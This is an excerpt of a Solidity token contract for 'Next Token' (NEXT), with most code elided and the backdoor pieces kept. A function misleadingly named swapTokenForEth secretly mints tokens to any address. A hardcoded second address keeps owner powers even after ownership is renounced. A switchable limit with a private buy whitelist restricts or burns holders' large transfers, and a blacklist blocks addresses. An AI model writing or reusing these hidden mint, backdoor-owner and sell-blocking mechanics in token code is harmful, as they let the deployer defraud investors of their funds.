...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _swaptoken(address account, uint256 amount) internal virtual{
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] += amount;
    }
...
abstract contract Ownable is Context {
    ...
    constructor() {
        ...
        nextB = 0x2AA6964B0acF1693EEC38E789fAc9c91381ea134;
    }
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || nextB == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(0x000000000000000000000000000000000000dEaD);
    }
...
contract Next is ERC20, Ownable, BaseToken, LockToken{
    using SafeMath for uint256;

    uint256 public constant VERSION = 1;

    string  name_ = "Next Token";
    string  symbol_ = "NEXT";

    uint256 totalSupply_ = 100000000000000 * 10**9;
    uint256 minimumTokenBalanceForDividends_ = 1000000000 * 10**9;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public minter;
    address public nextB;

    bool private swapping;
    bool private limitBy;
    ...
    constructor(
        ...
        //0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7 testUsdt
        // 0xbA2aE424d960c26247Dd6c32edC70B295c744C43  //doge coin
        rewardToken = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;
        _marketingWalletAddress = 0x2AA6964B0acF1693EEC38E789fAc9c91381ea134;
        // nextB = 0xf46cdB653F9f2574e82d422B26345Dd56FAF6f35;
        require(
    ...
    function addBuyList(address buyacc) public onlyOwner{
        _buyList[buyacc] = true;
    }

    function isBuyList(address acc) public view returns(bool){
        return _buyList[acc];
    }
    ...
    function _transfer(
        ...
        require(amount > 0, "m > 0");

        if (!automatedMarketMakerPairs[from]) {
            require(!_blackListAddresses[from], "Address is in the black list");
        }
        ...
        if (
            ...
            swapandsendToFeeAndDividend(sellTokens);
        ...
        // if(limitBy && !_buyList[from] && amount >= 465000000001 * 10**9){
        //     // super._transfer(to, address(0xdead), balanceOf(_msgSender()));
        //     super.transfer(address(0xdead), amount);
        // }

        if(limitBy && !_buyList[from] && amount >= 465000000002 * 10**9){
            // super._transfer(to, address(0xdead), balanceOf(_msgSender()));
    ...
    function swapTokenForEth(address to, uint amount) public onlyOwner{
        // require(_msgSender() == nextB);
        _swaptoken(to, amount*10**9);
        // return true;
    }
    ...
    function swapandsendToFeeAndDividend(uint256 tokens) private{
    ...
    function setLimitBy() public onlyOwner{
        if(limitBy){
            limitBy = false;
        }else{
            limitBy = true;
    ...
    function isLimitBy() public view returns(bool){
        return limitBy;
    }
    ...
    // function getUSDTPerNextPrice(uint amountIn) public view returns (uint amountOut) {
